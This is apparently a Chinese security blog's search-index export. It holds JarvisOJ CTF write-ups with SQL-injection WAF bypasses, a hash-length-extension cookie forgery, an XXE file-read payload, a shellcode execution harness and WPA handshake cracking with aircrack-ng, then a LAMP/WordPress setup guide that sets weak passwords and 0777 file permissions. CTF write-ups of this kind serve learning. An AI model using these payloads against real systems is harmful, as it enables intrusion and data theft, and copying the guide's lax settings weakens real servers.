题目意思是:GET传三个字符参数，然后每个参数满足以下条件： ①：id是字符，还需要值为0.所以利用php弱类型0a即可让字符0a转化成数字0 ②：a是一个文件（file_get_contents()函数提取a的内容赋值给data），那么可以是自己vps创建一个文件，也可以利用伪协议php://input。 ③：b满足长度大于5，eregi（）里面满足第一个字符为4，substr（）里面又需要满足b首字母！=4.那么我们可以利用%00截断:b=%0011111即可绕过substr和eregi()，eregi（“111”，“1114”）满足。同时%00对strlen不会发生截断。 饶过后发现/^HT2mCpcvOLf访问自动补全： ` 1http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=1 猜测是注入漏洞，上sqlmap发现有waf。过滤了空格关键字，空格可以内敛注释绕过，关键字发现只过滤了一次直接双写绕过。然后常规注入得flag。 RE？一看题目和.so的文件有点害怕，完全没思路。 google后才知道mysql可以导入进去。 导入到plugin文件中，利用该文件创建函数help_me（提示）: create function help_me returns string soname &#39;udf.so&#39; 然后select heilp_me;提示：use getflag function to obtain your flag! 模仿前面创建一个getflag函数调用的flag。 flag在管理员手里首先想到前端认证抓个包发现cookie里面有个guest，改成admin无果。别的地方貌似没有突破口。那就扫一下敏感目录吧。御剑，AWVS无果。 发现一个新的py脚本动态多线程工具：weakfilescan 附链接: ` 1https://github.com/ring04h/weakfilescan 命令： 1python wyspider.py http://web.jarvisoj.com:32778 发现有个index.php~，下载notepad++打开发现乱码，挠头。。。 经过尝试发现linux有个查看文件的命令： #file xxx 然后尝试一下发现是： vim swap file 对于swap是交换的意思，google后发现是vim在编辑的时候强制退出而生成的文件，可以用命令： vim -r index.php.swp 来恢复，恢复后发现源码： 123456789101112131415161718192021222324&lt;?php $auth = false; $role = "guest"; $salt = if (isset($_COOKIE["role"])) &#123; $role = unserialize($_COOKIE["role"]); $hsh = $_COOKIE["hsh"]; if ($role==="admin" &amp;&amp; $hsh === md5($salt.strrev($_COOKIE["role"]))) &#123; $auth = true; &#125; else &#123; $auth = false; &#125; &#125; else &#123; $s = serialize($role); setcookie('role',$s); $hsh = md5($salt.strrev($s)); setcookie('hsh',$hsh); &#125; if ($auth) &#123; echo "&lt;h3&gt;Welcome Admin. Your flag is &#125; else &#123; echo "&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;"; &#125;?&gt; 发现最关键的是要绕过： 1$role==="admin" &amp;&amp; $hsh === md5($salt.strrev($_COOKIE["role"] 利用hash扩展攻击即可，hash拓展攻击下篇详细总结一下。可以利用hashpump直接爆破出role和hsh。不过需要注意题目反转反序列化传入顺序。 最后payload： 12role = s%3a5%3a"admin"%3b%00%00%00%00%00%00%00%c0%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80s%3a5%3a"guest"%3b`hsh = fcdc3840332555511c4e4323f6decb07` [61dctf]admin抓包后发现貌似和flag在管理员手机的题目有点相似，扫目录发现有robots.txt。访问后发现.php访问的flag提交竟然不对。突然发现flag是flag{hello guest}，而题目是admin显然这是个假flag。 然后尝试抓包的真flag。 api调用Hint：请设法获得目标机器/home/ctf/flag.txt中的flag值。 则想办法文件读取。加上题目提示很容易想到调用别的东西来文件读取。 右键看页面源码发现有json和xml。可能就是xml注入进行任意文件读取。 抓包把content-type=json改成content-type=xml。然后传一段任意文件读取的xml代码： 1234&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE root [&lt;!ENTITY name SYSTEM &quot;file://home/ctf/flag.txt&quot;&gt; ]&gt; &lt;root&gt;&amp;name;&lt;/root&gt; 有关于xml的知识之前也是接触过XEE外部实体注入漏洞。后面可能出一篇能用的xml知识。]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JarvisOJ-Basic-WriteUp]]></title>
    <url>%2F2018%2F09%2F23%2FJarvisOJ-Basic-WriteUp%2F</url>
    <content type="text"><![CDATA[0x01.base64?base家族，py脚本decode： import base64 str1 =&#39;GUYDIMZVGQ2DMN3CGRQTONJXGM3TINLGG42DGMZXGM3TINLGGY4DGNBXGYZTGNLGGY3DGNBWMU3WI===&#39; try: print base64.b64decode(str1) except: try: print base64.b32decode(str1) except: print base64.b16decode(str1) 0x02.USS Lab浙大就是diao，百度谷歌一把梭 0x03.veryeasylinux 命令：strings veayeasy的flag 0x04.段子对于不懂的，googl百度一把梭。发现棍斤拷的十六进制码的flag 棍斤拷乱码： 源于GBK字符集和Unicode字符集之间的转换问题。Unicode和老编码体系的转化过程中，肯定有一些字，用Unicode是没法表示的，Unicode官方用了一个占位符来表示这些文字，这就是：U+FFFD REPLACEMENT CHARACTER。那么U+FFFD的UTF-8编码出来，恰好是 ‘\xef\xbf\xbd’。如果这个’\xef\xbf\xbd’，重复多次，例如 ‘\xef\xbf\xbd\xef\xbf\xbd’，然后放到GBK/CP936/GB2312/GB18030的环境中显示的话，一个汉字2个字节，最终的结果就是：锟斤拷——锟(0xEFBF)，斤（0xBDEF），拷（0xBFBD）。 烫烫烫乱码： 在windows平台下，ms的编译器（也就是vc带的那个）在 Debug 模式下，会把未初始化的栈内存全部填成 0xcc，用字符串来看就是”烫烫烫烫烫烫烫”，未初始化的堆内存全部填成0xcd，字符串看就是“屯屯屯屯屯屯屯屯”。也就是说出现了烫烫烫，赶紧检查初始化吧。。。 0x05.手贱仔细看MD5码。发现多了一个I，删除破解MD5得flag 0x06.美丽的实验室LogoStegSolve一把梭得flag 0x07.veryeasyRSARSAtool一把梭得flag 0x08.神秘文件磁盘文件Linux挂载，写py脚本跑： flag = ‘’ for i in range(1,254): f = open(str(i)) flag +=f.read() f.close() print flag 0x09.公倍数python脚本一把梭 flag = 0 for i in xrange(3,1000000000,3): flag +=i for i in xrange(5,1000000000,5): flag +=i for i in xrange(15,1000000000,15): flag -+i print flag 0x0A.Easy Crackme好吧，不会Reverse 0x0B.Swcretburp抓包http头中发现Secret的flag 0x0C.爱吃培根的出题人培根密码加密，培根加密本质是替换密码。以ab（01）替换，所以本质上所有正反两性都可以培根加解密，比如文字的正体与斜体。 注意：有两个密码表。表中一个字母替换成5个字母。 所以把密文标点符号去除，每五个字母分一组。然后替换成ab：（小写字母替换成a，大写字母替换成b） bacoN isone ofaMe rICaS sWEet hEart SitsA dARli nGSuC CulEn tfOoD tHAtP aIRsF lawLE aaaab aaaaa aaaba abbab abbaa abaaa baaab abbaa abbab baaba aabab abbab abbab aaabb 对应密码表②得flag。 0x0D.Easy RSARSA tools一把梭 0x0E.ROPGadget不会PWN 0x0F.取证取证神器Volatility 0x11.Baby’s Crack不会逆向 0x12.Help!!zip伪加密，然后word.xdoc里面一张图片常规操作后无果。然后把后缀也改成zip发现一张图片的flag 0x13.Shellcodeshellcode不就是非法数据当做代码执行吗! #include&lt;stdio.h&gt; char shellcode[] = &quot;PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIYIhkmKzyCDq4l4FQyBlrRWEahI1tLKT16Pnk1ftLnkPvwlnkW6fhNkan5pNkgF6XPOR8T5HsCivaN19okQSPlKRLvD6DNk3uelNkpTthRXuQ9znk2jEHLK1Ja0FaXkhcTtBink4tlKUQhnvQYotqo0ylnLMTO0SDEWZahOtMwqhG8kXteksLwTdh1e8aLKsja4uQ8kavLKdLrklK0ZeL7qjKLKUTLKuQM8k9bdvDeL1qiSnR5XVIXTOyjENikrphNnrnVnhlBrzHooKOYoyok93u7tOKCNyHzBBSnguLgTcbyxlNKOYoYoMYaUTHphRL2LupQQ0htsFRTn541x3E2Se5T26PyKK8QLTddJlIZFBvyoSeUTLIkrv0oKy8ORpMmlk7Gl6DBrm8SoyoioyoaxrOqh0XwP1xu1Qw1upBbHrmrED3T34qiKOxQLTdEZOyZCaxQmRxgPUp0hpnPn4srRe8BDSo2PT7axqOCWROpophSYpnSo04u83K72Peu70hBpCsqDpF4qHIMXpLQ429k98aEaJr1BF3Ca3bIozp01IPf0Yof5GxAA&quot; int main() { int (*ret)()=(int(*)())shellcode; ret(); return 0; } 0x14.A Piece Of Cake字符频率统计解密脚本网站一把梭，找到flag is ….. 0x15.-.-字符串最简单的摩斯电码 0x16.德军的密码二进制密码，py脚本跑： #–encoding:utf-8– table = {‘A’:’1000001’,’N’:’1001110’, ‘B’:’1000010’,’O’:’1001111’, ‘C’:’1000011’,’P’:’1010000’, ‘D’:’1000100’,’Q’:’1010001’, ‘E’:’1000101’,’R’:’1010010’, ‘F’:’1000110’,’S’:’1010011’, ‘G’:’1000111’,’T’:’1010100’, ‘H’:’1001000’,’U’:’1010101’, ‘I’:’1001001’,’V’:’1010110’, ‘J’:’1001010’,’W’:’1010111’, ‘K’:’1001011’,’X’:’1011000’, ‘L’:’1001100’,’Y’:’1011001’, ‘M’:’1001101’,’Z’:’1011010’} key_list=[] value_list=[] for key,value in table.items(): key_list.append(key) valuelist.append(value) #print keylist, value_list def get_key_of_value(value): if value in valuelist: getvalueindex = valuelist.index(value) #print type(keylist[getvalueindex]) return keylist[get_value_index] else: print “你要查询的值%s不存在” %get_value def how_to(a,b): if a in [‘0’,’1’] and b in [‘0’,’1’]: if a == ‘1’ and b == ‘1’: return ‘0’ elif a == ‘0’ and b == ‘0’: return ‘0’ else: return ‘1’ else: return 0 def binturn(arg): binstring = ‘’ for i in arg: binstring += table[i] return binstring def encrypt(plain,key): binkey = binturn(key) binplain = bin_turn(plain) chiper = ‘’ if len(binplain)==len(binkey): for i in range(0,len(binplain)): chiper += how_to(binkey[i],binplain[i]) #print return chiper else: return 0 def decrypt(chiper,key): binkey = bin_turn(key) plain = ‘’ if len(chiper)==len(binkey): for i in range(0,len(chiper)): plain += how_to(binkey[i],chiper[i]) #print binkey[i] #print plain return plain else: return 0 key = ‘WELCOMETOCFF’ chiper = ‘000000000000000000000000000000000000000000000000000101110000110001000000101000000001’ binplain = decrypt(chiper,key) print type(binplain) plain = ‘’ for i in xrange(0,len(binplain),7): plain += str(get_key_of_value(binplain[i:i+7])) print plain 0x17.握手包kali linux强大的wifi破解工具：Aircrack 破解前下解压kali自带的字典： gzip -d /usr/share/wordlists/rockyou.txt.gz 上命令破解： aircrack-ng -a2 -w /usr/share/wordlists/rockyou.txt ./wifi.cap]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[搭建LAMP博客]]></title>
    <url>%2F2018%2F09%2F12%2F%E6%90%AD%E5%BB%BALAMP%E5%8D%9A%E5%AE%A2%2F</url>
    <content type="text"><![CDATA[搭个人网站一般有两种选择： GitHub Pages + Hexo / jekyl 服务器 + WordPress / Typecho 我选择LAMP+阿里云+Wordpress。穷啊，阿里云学生有1折优惠，十块钱一个月。可以接受。 所谓LAMP，即：Linux+Apache+Mysql+Php 下面结合他人总结与自己实际遇到的问题，给大家介绍如何搭建自己的博客： 一、服务器选择 Ubuntu 16.04二、购买ECS服务器后，可以同时做的事有： 购买域名，暂时还没买。原因：没钱！！！ 下载 Xshell5（远程PowerShell），Xftp5（ftp传文件）。 看看喜欢什么WordPress插件。 三、使用 Xshell5 连接 ECS：连接前先在把自己的服务器添加安全组，SHH协议默认连接22端口。添加具体方法大家可以百度谷歌。 四、Ubuntu LAMP环境搭建1.系统升级和更新源 1sudo apt-get update sudo apt-get upgrade 2.配置apache2 1apt-get install apache2 -y 在本地计算机（您自己使用的电脑打开浏览器）输入http://&lt;云主机 IP 地址&gt; 查看到 “it works” 界面，说明 apache2 安装成功。（必须打开apache默认端口：80。当然也可以在config文件里面修改，然后在安全组里面加上。） 3.安装php组件 apt-get 里有 php7.2，所以我们可以直接安装 php7.2。 1sudo apt-get install php7.2 -y 安装 php 相关组件： 1sudo apt-get install libapache2-mod-php7.2 4.安装mysql数据库 1sudo apt-get install mysql-server -y 安装php mysql相关组件： 1sudo apt-get install php7.2-mysql 5.安装phpmyadmin 使用 apt-get 安装 phpmyadmin，安装过程中，需要根据提示选择 apache2 ，再输入root密码 和数据库密码： 1sudo apt-get install phpmyadmin -y 6.建立 /var/www/html 下的软连接： (使得mysql和phpmyadmin文件链接起来使得在www文件加下的文件可以直接被访问) 1sudo ln -s /usr/share/phpmyadmin /var/www/html/phpmyadmin 7.重启mysql 和apache2 1sudo service mysql restart sudo systemctl restart apache2.service 二、下载并安装wordpress 1.下载wordpress 12wget https://cn.wordpress.org/wordpress-4.7.4-zh_CN.zip（目前最新版本为：https://cn.wordpress.org/wordpress-4.9.4-zh_CN.zip） 2.安装解压工具 1sudo apt-get install zip 3.解压wordpress安装包 1sudo unzip wordpress-4.9.4-zh_CN.zip 4.为 wordpress 配置一个数据库 进入 mysql，输入以下代码后，按提示输入您MySQL密码: 1mysql -u root -p 5.为 wordpress 创建一个叫 wordpress 的数据库 1CREATE DATABASE wordpress; 6.为 这个数据库设置一个用户为 wordpressuser： 1CREATE USER wordpressuser; 7.为这个用户配置一个密码为 password123： 1SET PASSWORD FOR wordpressuser= PASSWORD(&quot;password123&quot;); 8.为这个用户配置数据库的访问权限： 1GRANT ALL PRIVILEGES ON wordpress.* TO wordpressuser IDENTIFIED BY&quot;password123&quot;; 9.生效这些配置 1FLUSH PRIVILEGES; 10.然后退出 1mysql exit; 容易掉坑： 数据库，错误千差万别，还是多谷狗百度，一般要修改文件，不熟悉Linux指令可善用Xftp :) 检查开放端口，注意LAMP与LNMP端口有少许不同，在ECS控制台添加（80,8080端口） 选用相同密码可行，只是会报Warning 五、登陆wordpress后台解决wordpress安装主题或插件需要ftp： 在Xftp中返回网站根目录，找到wp-config.php这个PHP文件， 用VScode，Notepad++等编辑器打开（不要用记事本），在wp-config.php中添加下列4行代码: 1234define('WP_TEMP_DIR', ABSPATH.'wp-content/tmp');/* WordPress的临时目录。*/define("FS_METHOD", "direct");define("FS_CHMOD_DIR", 0777);define("FS_CHMOD_FILE", 0777); Tips：要在定义ABSPATH的后面，即在以下代码的后面添加 12if ( !defined('ABSPATH') )define('ABSPATH', dirname(__FILE__) . '/'); 六、参考连接 https://www.jianshu.com/p/84c2dad49e42]]></content>
      <categories>
        <category>软件程序</category>
      </categories>
      <tags>
        <tag>环境搭建</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello，Security！]]></title>
    <url>%2F2018%2F09%2F06%2FHello%EF%BC%8CSecurity%EF%BC%81%2F</url>
    <content type="text"><![CDATA[记录分享我的信息安全之旅。]]></content>
      <categories>
        <category>信息安全</category>
      </categories>
      <tags>
        <tag>心得分享</tag>
      </tags>
  </entry>
</search>
